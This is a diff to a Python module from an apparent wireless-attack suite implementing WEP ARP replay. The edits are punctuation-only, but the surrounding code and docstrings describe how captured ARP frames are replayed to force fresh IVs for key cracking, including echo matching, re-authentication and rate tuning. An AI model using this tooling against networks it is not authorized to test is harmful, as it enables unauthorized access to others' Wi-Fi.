@@ -1,20 +1,20 @@
-"""WEP ARP replay (`aireplay-ng -3`) — the IV workhorse.
+"""WEP ARP replay (`aireplay-ng -3`): the IV workhorse.
 
 Re-injects a captured WEP-encrypted ARP request on a loop. The AP can't tell
-it's a replay (WEP has no replay protection — that absence is *why* this
+it's a replay (WEP has no replay protection: that absence is *why* this
 works), so it decrypts and rebroadcasts each one under a FRESH IV. Every
 rebroadcast is a new unique IV for the cracker. This is the only attack in
 the suite that actually generates IVs; fake-auth gates it and (later)
 frag/chopchop only manufacture an ARP to feed it.
 
-Only ToDS (client→AP) ARPs are usable seeds — the collector enforces that.
+Only ToDS (client→AP) ARPs are usable seeds. The collector enforces that.
 
 Candidate handling (deliberately PATIENT): the AP's rebroadcast of a good ARP
 can arrive a beat after a single short burst, so judging a candidate on one
 cycle falsely condemns replayable seeds. Instead each candidate gets a multi-
 second trial; only a sustained absence of echoes blacklists it. "Replayable"
-means the AP echoed OUR frame back — we match its rebroadcast on FromDS +
-broadcast DA + SA==our MAC, the same correlation frag/chopchop use — NOT that
+means the AP echoed OUR frame back: we match its rebroadcast on FromDS +
+broadcast DA + SA==our MAC, the same correlation frag/chopchop use, NOT that
 the global IV count happened to rise (another client's traffic must never be
 mistaken for a working replay). Once the AP echoes one, we lock on and keep
 replaying it. If a locked winner stalls (likely we got de-associated) we ask
@@ -22,7 +22,7 @@ fake-auth to re-auth and keep the same seed rather than discarding it.
 
 Operating shape (deliberately SIMPLE): fixed 1-second windows. Each window we
 blast ``rate`` packets at the card's full speed, then sleep out the rest of the
-second (one ~1s sleep — immune to Windows' ~15ms timer granularity, unlike
+second (one ~1s sleep, immune to Windows' ~15ms timer granularity, unlike
 per-frame pacing) while the AP's rebroadcasts land. Count IVs gained that
 second, then a perturb-and-observe step nudges ``rate`` toward more IVs/s. No
 per-cycle pacing math, no idle-heavy small bursts capping the duty cycle.
@@ -145,7 +145,7 @@ class WepArpReplay:
         self._po_prev_ivs_s = -1.0
         self._ivs_ewma = -1.0
         self._echoes = 0
-        # Watch for the AP echoing our replays back — the "replayable" signal.
+        # Watch for the AP echoing our replays back: the "replayable" signal.
         self.iface.register_rx_callback(self._rx_cb)
         self._task = asyncio.create_task(self._replay_loop())
         logger.info("[WEP-ARP] Replay started on %s", self.bssid)
@@ -166,7 +166,7 @@ class WepArpReplay:
         return self.stats
 
     def pause(self) -> None:
-        """Halt TX without tearing down — for the frag/chopchop sub-modes that
+        """Halt TX without tearing down, for the frag/chopchop sub-modes that
         need exclusive use of the radio."""
         self._paused = True
 
@@ -271,7 +271,7 @@ class WepArpReplay:
     # ---- Echo watch (RX callback) -------------------------------------------
 
     def _rx_cb(self, pkt) -> None:
-        """Count the AP echoing one of OUR replays — the "replayable" signal."""
+        """Count the AP echoing one of OUR replays: the "replayable" signal."""
         frame = pkt.raw
         if not self._active or self._paused or len(frame) < 22:
             return
@@ -293,7 +293,7 @@ class WepArpReplay:
         then sleep out the rest of the second while the AP's rebroadcasts land."""
         frame = self._build_replay_frame(cand)
         if frame is None:
-            # Malformed capture — blacklist and move on.
+            # Malformed capture: blacklist and move on.
             self._failed.add(cand)
             self._current = None
             return 0
@@ -311,7 +311,7 @@ class WepArpReplay:
             except Exception:
                 logger.exception(f"[WEP-ARP] failed to send frame during burst (sent={sent})")
                 break
-        send_dt = max(1e-3, time.time() - t0)   # burst only — the hardware cap
+        send_dt = max(1e-3, time.time() - t0)   # burst only: the hardware cap
         # Wait out the remainder of the 1s window
         await asyncio.sleep(max(0.0, self._WINDOW_S - send_dt))
         window_dt = max(1e-3, time.time() - t0)
@@ -350,7 +350,7 @@ class WepArpReplay:
             if stalled > self._STALL_REAUTH_AFTER and not self._reauth_requested:
                 self._reauth_requested = True
                 self._request_reauth()
-                self._log("[yellow]ARP replay stalled — re-authenticating[/yellow]")
+                self._log("[yellow]ARP replay stalled: re-authenticating[/yellow]")
             if stalled > self._STALL_DEMOTE_AFTER:
                 self._winner = None
                 self._current = None
